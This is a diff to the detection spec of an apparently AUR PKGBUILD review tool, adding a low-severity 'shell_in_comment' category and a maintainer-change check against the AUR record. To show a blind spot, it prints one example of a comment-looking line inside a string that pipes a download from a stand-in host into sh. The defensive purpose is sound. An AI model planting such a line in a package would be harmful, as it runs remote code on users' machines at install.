@@ -1,6 +1,6 @@
 # Analyzer Detection Specs
 
-> Last updated: 2026-11-07
+> Last updated: 2026-11-09
 > Status: Active
 > Companion docs: `risk-analysis.md` (severity tiers), `domain.md`
 > § Finding, `sprints/s05-analyzers-policy.md` § Category Taxonomy,
@@ -21,6 +21,8 @@
 - Analyzers: [URL](#url-analyzer), [Checksum](#checksum-analyzer),
   [Shell](#shell-analyzer), [Depends](#depends-analyzer),
   [Pkgbuild](#pkgbuild-analyzer)
+- [AUR Record](#aur-record): the maintainer check, which reads the AUR,
+  not the files
 - [Known Limitations](#known-limitations)
 - [Cross-References](#cross-references)
 
@@ -92,9 +94,10 @@ Limitations).
 | --- | --- | --- | --- |
 | URL | new download locations in `source` arrays | whole old and new PKGBUILD | `url_new` (High) |
 | Checksum | weakened verification, new signing keys, version changes | whole old and new PKGBUILD | `pgp_removed` (High), `checksum_removed` (High), `pgp_key_changed` (Medium), `checksum_refresh` (Low), `version_bump` (Low) |
-| Shell | code that runs other code or uses the network; `.install` scriptlets added or changed | added lines of the PKGBUILD and `.install` diffs; `.install` file headers | `shell_exec` (High), `network_download` (High), `install_changed` (Medium) |
+| Shell | code that runs other code or uses the network; `.install` scriptlets added or changed | added lines of the PKGBUILD and `.install` diffs; `.install` file headers | `shell_exec` (High), `network_download` (High), `shell_in_comment` (Low, a match on a line starting with `#`), `install_changed` (Medium) |
 | Depends | dependencies added | whole old and new PKGBUILD | `depends_added` (Medium) |
 | Pkgbuild | arrays the parser could not read | whole new PKGBUILD | `array_unreadable` (High) |
+| AUR record (review engine, not an analyzer) | a change of AUR maintainer or co-maintainers | the AUR's RPC record, read during analysis, against the last recorded one | `maintainer_changed` (Medium) |
 
 Severities are defaults from `risk-analysis.md` § Categories. Each
 analyzer's section below gives its exact rules.
@@ -468,9 +471,34 @@ real hash — normal version-bump housekeeping) and `version_bump`.
    have several (before #476 only the last one was scanned).
 
 **Categories produced:** `shell_exec`, `network_download`,
-`install_changed`. The first two may both be emitted for the same line if
-it matches both pattern sets (e.g. `curl ... | bash` is simultaneously a
-download and a dynamic-code execution — see worked example).
+`shell_in_comment`, `install_changed`. The first two may both be emitted
+for the same line if it matches both pattern sets (e.g. `curl ... | bash`
+is simultaneously a download and a dynamic-code execution — see worked
+example).
+
+### Comment Lines
+
+An added line whose first non-blank character is `#` and which matches
+any pattern below gives **one** finding, `shell_in_comment` (Low), in
+place of its `shell_exec` and `network_download` findings. The summary is
+`Comment line (runs only inside a string or heredoc): <line>` (#494).
+
+Such a line is usually a comment, and a High for a comment that quotes a
+command is noise. But it is not always a comment. Inside a multi-line
+double-quoted string or an unquoted heredoc, bash runs the line's `$(…)`
+and backticks when the PKGBUILD is sourced, so
+
+```bash
+_note="
+# $(curl -s https://evil.example/x | sh)
+"
+```
+
+downloads and runs code. Telling the two apart would need quote and
+heredoc tracking over the maintainer's own file, which they can mislead
+(an unbalanced apostrophe in heredoc text). So the match is kept, at Low,
+and the reviewer reads the line in the diff. A trailing comment after
+code (`cmd # note`) does not start with `#` and is scanned as before.
 
 ### Scope
 
@@ -631,6 +659,43 @@ High, like an unmapped category (`risk-analysis.md` § Unmapped
 categories): a part of the file no check could read must not look like
 a part with nothing to report. An unreadable array of the old file
 gives no finding; its new entries all count as new instead.
+
+---
+
+## AUR Record
+
+Not an analyzer: analyzers read the files of the change, and this check
+reads the AUR. The review engine runs it after the analyzers, as part of
+the same analysis (`domain.md` § AUR Record, #495).
+
+**Input:** the package's AUR RPC v5 `info` record, read once per
+analysis with the AUR client's timeout, and the review's `priorAur`
+(the last recorded maintainer record from an earlier review).
+
+**Category produced:** `maintainer_changed` (Medium). `Analyzer` is
+`"aur"`, `Location` is `AUR record`, `Details` holds both records.
+
+| Prior record | Current record | Result |
+| --- | --- | --- |
+| none (first review, pre-#495 review, or none recorded) | any | no finding; the Findings tab says the maintainer was not compared and why |
+| maintainer M | maintainer M, same co-maintainers | no finding; the tab says unchanged since the prior record's date |
+| maintainer A | maintainer B | `AUR maintainer changed: A → B (since the review of <date>)` |
+| maintainer A | orphaned | `Package orphaned: was A (since the review of <date>)` |
+| orphaned | maintainer B | `Package adopted by B (since the review of <date>)` |
+| same maintainer | co-maintainers differ | `Co-maintainers changed: added X; removed Y (since the review of <date>)` |
+
+`<date>` is the date the prior record was read. Co-maintainers are
+compared as sets; the AUR leaves the key out when there are none.
+
+A failed read gives no finding and does not fail the analysis; the tab
+says the record was not read and why. The same read gives the package's
+first-submitted date, votes and popularity, shown on the tab as lines,
+not findings: they are not changes.
+
+**Limitations:** the AUR reports the current maintainer only. A takeover
+of the maintainer's account keeps the name and is not detected. A change
+is flagged at the next *analysed* review: a review approved without
+analysis records nothing and passes the older record on.
 
 ---
 
